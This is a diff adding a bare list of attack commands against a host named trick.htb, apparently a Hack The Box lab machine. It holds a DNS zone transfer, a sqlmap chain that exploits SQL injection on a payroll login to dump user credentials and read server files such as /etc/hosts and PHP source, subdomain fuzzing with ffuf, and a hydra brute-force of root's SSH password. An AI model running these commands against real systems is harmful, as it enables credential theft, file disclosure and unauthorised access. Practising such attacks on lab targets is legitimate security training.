@@ -1,0 +1,20 @@
+dig trick.htb axfr @10.10.11.166
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch --dbs
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch -D payroll_db --tables
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch -D payroll_db -T users --columns
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch -D payroll_db -T users -C name,username,password --dump
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch --file-read=/etc/hosts
+
+ffuf -u 'http://trick.htb/' -w subdomains-top1million-110000.txt -H "Host: FUZZ.trick.htb" -t 256 --fl 84
+
+sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --batch --file-read=/var/www/market/index.php
+
+hydra 10.10.11.166 ssh -l root -P rockyou.txt -t 32
+
